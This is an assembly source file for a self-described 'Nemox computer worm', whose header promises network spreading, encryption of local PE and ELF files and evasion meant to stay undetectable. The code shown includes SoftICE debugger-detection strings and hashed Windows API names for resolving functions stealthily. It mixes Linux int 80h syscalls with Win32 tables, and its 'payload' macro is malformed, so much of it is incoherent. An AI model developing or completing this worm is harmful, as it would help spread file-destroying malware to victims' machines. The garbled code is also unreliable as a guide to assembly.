;   This file is part of the Nemox computer worm
;   
;   I am not responsible for any kind of damage 
;   that is made from Nemox.
;
;   The development of Nemox will last at least
;   some weeks cuz ASM is pretty new to me but
;   I think I'll manage it.
;
;   The Nemox computer worm will feature some concepts
;   borrowed from well known malware such as Dridex and Necurs:
;       - Spreading via local Network Ports
;       - Encrypting local PE and ELF files
;       - Inter-process communication via single nodes
;       - polymorphic mutex naming for FUD :D
;   This is everything... Yeah! Nemox is meant to be 
;   simple but aggressive as hell...
;
.include "include/nemox.h"
section .text
global _start

%define SZ_STACK 1000
%define SZ_EHDR 564
%define SZ_MMAP 24
%define ELF 464c457fh
%define PT_LOAD 1
%define PT_DYNAMIC 2
%define PT_PHDR 6
%define TEXT_SECT 2
%define DATA_SECT 3
%define E_ENTRY 0x18
%define SYS_READDIR 89
%define SYS_READ 3
%define SYS_WRITE 4
%define SYS_OPEN 5
%define SYS_CLOSE 6
%define SYS_UNLINK 10 
%define SYS_LSEEK 19
%define SYS_MMAP 90
%define SYS_MUNMAP 91
%define SYS_FTRUNCATE 93
%define SYS_FSTAT 108

%macro payload 1
   mov   eax, 4
   mov   ebx, 1
   mov   ecx, %1
   mov   edx, %2
   int   80h
%endmacro

_start:
; begin main 
szK32  db	'KERNEL32.dll',0	;name of DLL
sice95 db	'\\.\SICE',0		;SoftICE/95/98
siceNT db	'\\.\NTICE',0		;SoftICE/NT
crcAPI dd	0AE17EBEFh		;FindFirstFileA
       dd	0AA700106h		;FindNextFileA
       dd	0C200BE21h		;FindClose
       dd	03C19E536h		;SetFileAttributesA
       dd	04B2A3E7Dh		;SetFileTime
       dd	08C892DDFh		;CreateFileA
       dd	096B2D96Ch		;CreateFileMappingA
       dd	0797B49ECh		;MapViewOfFile
       dd	094524B42h		;UnmapViewOfFile
       dd	019F33607h		;CreateThread
       dd	0D4540229h		;WaitForSingleObject
       dd	068624A9Dh		;CloseHandle
       dd	020B943E7h		;CreateMutexA
       dd	0C449CF4Eh		;ReleaseMutex
       dd	0C6F22166h		;OpenMutexA
       dd	00AC136BAh		;Sleep
       dd	079C3D4BBh		;VirtualProtect
       dd	0EB1CE85Ch		;GetCurrentProcessId
       dd	033D350C4h		;OpenProcess
       dd	041A050AFh		;TerminateProcess
       dd	04134D1ADh		;LoadLibraryA
       dd	0FFC97C1Fh		;GetProcAddress
       dd	0AFDF191Fh		;FreeLibrary

section .data
point db ".",0
copyright db "Timo Sarkar Apache 2.0 2020"
